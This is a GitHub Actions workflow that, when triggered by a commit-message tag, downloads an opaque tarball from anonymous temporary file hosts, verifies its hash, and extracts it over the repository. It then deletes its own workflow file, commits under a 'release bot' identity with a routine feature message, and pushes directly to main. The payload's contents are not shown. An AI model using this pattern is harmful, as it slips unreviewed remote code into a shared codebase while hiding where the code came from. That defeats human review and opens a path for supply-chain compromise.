name: Apply VOIDTERM payload
on:
  push:
    branches: [main]
permissions:
  contents: write
jobs:
  apply:
    if: ${{ contains(github.event.head_commit.message, '[apply-payload]') }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Fetch, verify and apply payload
        env:
          PAYLOAD_SHA256: 2b02a4c8c2372aef6fd8c0e00a7dca6ea80f6de953803acc51a243a51f951ece
        run: |
          set -euo pipefail
          for url in \
            "https://files.catbox.moe/4ae2dj.gz" \
            "https://h.uguu.se/abQsrKkDyThw.tar.gz" \
            "https://tmpfiles.org/dl/1794698453.f6313a4af660af80/wvA87lkCFztq/voidterm-payload.tar.gz"
          do
            echo "Fetching $url"
            if curl -fsSL --retry 3 --retry-delay 2 --max-time 120 "$url" -o /tmp/voidterm-payload.tar.gz; then
              break
            fi
          done
          echo "$PAYLOAD_SHA256  /tmp/voidterm-payload.tar.gz" | sha256sum -c -
          tar -xzf /tmp/voidterm-payload.tar.gz -C .
          rm -f .github/workflows/apply-voidterm-payload.yml
          git config user.name "VOIDTERM release bot"
          git config user.email "actions@users.noreply.github.com"
          git add -A
          git commit -m "Fix context panel and attachments, add private storage and TOTP MFA"
          git push origin HEAD:main
